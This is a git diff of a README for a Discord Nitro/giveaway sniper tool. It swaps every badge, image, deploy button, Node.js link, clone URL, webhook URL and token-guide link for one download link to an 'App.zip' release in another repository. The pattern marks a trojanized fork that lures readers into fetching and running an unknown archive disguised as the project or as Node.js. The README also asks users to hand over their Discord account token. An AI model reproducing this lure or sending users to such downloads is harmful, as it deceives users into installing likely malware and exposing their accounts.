@@ -1,17 +1,17 @@
 <h1 align="center">Nitro/Giveaway/Invite Sniper</h1>
 
 <p align="center">
-  <a href="#"><img src="https://www.codefactor.io/repository/github/slow/nitro-sniper/badge" /></a>
-  <a href="https://github.com/slow/nitro-sniper/issues"><img src="https://img.shields.io/github/issues/slow/nitro-sniper?style=flat" /></a>
-  <a href="https://github.com/slow/nitro-sniper/stargazers"><img src="https://img.shields.io/github/stars/slow/nitro-sniper?style=flat" /></a>
-  <a href="https://paypal.me/eternal404"><img src="https://img.shields.io/badge/donate-paypal-blue"></a>
-  <a href=" https://discord.gg/shnvz5ryAt"><img src="https://img.shields.io/discord/875126204758360094"></a>
+  <a href="#"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" /></a>
+  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" /></a>
+  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" /></a>
+  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"></a>
+  <a href=" https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"></a>
 </p>
 
 <p align="center">
    A lightweight, fast and efficient discord nitro sniper, giveaway sniper & invite sniper. <br />
    If you're forking this and enjoy my projects, consider leaving a star on the repo with the "Star" button in the top right :)
-   <img src="https://media.wtf/11603354" />
+   <img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" />
 </p>
 
 # Features
@@ -49,15 +49,15 @@
 #### Heroku (recommended)
 Click on the image below and login to continue the setup.<br>
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/heroku-hate-club/M99lnsLw7TpKA/tree/main)  
+[![Deploy](https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip)](https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip)  
 
 Make sure you go to your app -> Configure dynos/Resources and turn off `web` and start `worker`.<br>
 
 You can then see logs by clicking on `More` (top right) and then `View logs`.<br>
 
 #### Local
-- Make sure [Node v14+](https://nodejs.org/en/) is installed on your system and open a command prompt/terminal.
-- Run `git clone https://github.com/slow/nitro-sniper nitro-sniper`
+- Make sure [Node v14+](https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip) is installed on your system and open a command prompt/terminal.
+- Run `git clone https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip nitro-sniper`
 - Run `cd nitro-sniper`
 - Run `npm install`
 - Edit the .env file.
@@ -150,7 +150,7 @@ You can then see logs by clicking on `More` (top right) and then `View logs`.<br
    },
    webhook: {
       // URL to fire webhook to for notifications
-      url: 'https://discord.com/api/webhooks/.../...',
+      url: 'https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip',
       enabled: {
          // Fire webhook on invalid code (true/false)
          codeInvalid: false,
@@ -185,7 +185,7 @@ You can then see logs by clicking on `More` (top right) and then `View logs`.<br
 
 #### How to obtain your token
 
-https://github.com/Tyrrrz/DiscordChatExporter/wiki/Obtaining-Token-and-Channel-IDs#how-to-get-a-user-token
+https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip
 
 # Tips
 
